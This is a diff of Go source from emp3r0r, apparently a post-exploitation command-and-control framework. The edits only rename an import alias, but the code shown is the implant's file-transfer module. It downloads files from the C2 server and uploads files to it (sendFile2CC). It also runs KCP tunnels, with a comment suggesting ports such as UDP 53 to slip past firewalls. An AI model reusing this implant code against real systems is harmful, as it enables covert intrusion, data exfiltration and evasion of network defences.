@@ -13,7 +13,7 @@ import (
 	"time"
 
 	"github.com/cavaliergopher/grab/v3"
-	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
+	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	"github.com/mholt/archives"
@@ -51,7 +51,7 @@ func SmartDownload(download_addr, file_to_download, path, checksum string) (data
 // if path is empty, return []data instead
 func DownloadViaC2(file_to_download, path, checksum string) (data []byte, err error) {
 	url := fmt.Sprintf("%s%s/%s?file_to_download=%s",
-		emp3r0r_data.CCAddress, tun.FileAPI, url.QueryEscape(RuntimeConfig.AgentTag), url.QueryEscape(file_to_download))
+		emp3r0r_def.CCAddress, tun.FileAPI, url.QueryEscape(RuntimeConfig.AgentTag), url.QueryEscape(file_to_download))
 	log.Printf("DownloadViaCC is downloading from %s to %s", url, path)
 	retData := false
 	if path == "" {
@@ -71,7 +71,7 @@ func DownloadViaC2(file_to_download, path, checksum string) (data []byte, err er
 
 	// use EmpHTTPClient if no path specified
 	if retData {
-		client := tun.EmpHTTPClient(emp3r0r_data.CCAddress, RuntimeConfig.C2TransportProxy)
+		client := tun.EmpHTTPClient(emp3r0r_def.CCAddress, RuntimeConfig.C2TransportProxy)
 		if client == nil {
 			err = fmt.Errorf("failed to initialize HTTP client")
 			return
@@ -106,7 +106,7 @@ func DownloadViaC2(file_to_download, path, checksum string) (data []byte, err er
 
 	// use grab
 	client := grab.NewClient()
-	client.HTTPClient = tun.EmpHTTPClient(emp3r0r_data.CCAddress, RuntimeConfig.C2TransportProxy)
+	client.HTTPClient = tun.EmpHTTPClient(emp3r0r_def.CCAddress, RuntimeConfig.C2TransportProxy)
 	if client.HTTPClient == nil {
 		err = fmt.Errorf("failed to initialize HTTP client")
 		return
@@ -175,7 +175,7 @@ func sendFile2CC(filepath string, offset int64, token string) (err error) {
 
 	// connect
 	url := fmt.Sprintf("%s%s/%s",
-		emp3r0r_data.CCAddress,
+		emp3r0r_def.CCAddress,
 		tun.FTPAPI,
 		token)
 	conn, _, _, err := ConnectCC(url)
@@ -226,7 +226,7 @@ func FileServer(port int, ctx context.Context, cancel context.CancelFunc) (err e
 	// the KCP server will listen on user's specified port while the HTTP server listens on a random port
 	// common ports such as UDP 53 can be specified to bypass firewall
 	portstr := fmt.Sprintf("%d", port)
-	go tun.KCPTunServer(listen_addr, portstr, RuntimeConfig.Password, emp3r0r_data.MagicString, ctx, cancel)
+	go tun.KCPTunServer(listen_addr, portstr, RuntimeConfig.Password, emp3r0r_def.MagicString, ctx, cancel)
 
 	go func() {
 		<-ctx.Done()
@@ -270,7 +270,7 @@ func RequestAndDownloadFile(address, filepath, path, checksum string) (err error
 
 	// start local KCP client tunnel to connect to KCP server then HTTP server
 	kcp_listen_port := fmt.Sprintf("%d", util.RandInt(10000, 50000))
-	go tun.KCPTunClient(address, kcp_listen_port, RuntimeConfig.Password, emp3r0r_data.MagicString, ctx, cancel)
+	go tun.KCPTunClient(address, kcp_listen_port, RuntimeConfig.Password, emp3r0r_def.MagicString, ctx, cancel)
 
 	// wait until port is open
 	for !tun.IsPortOpen("127.0.0.1", kcp_listen_port) {
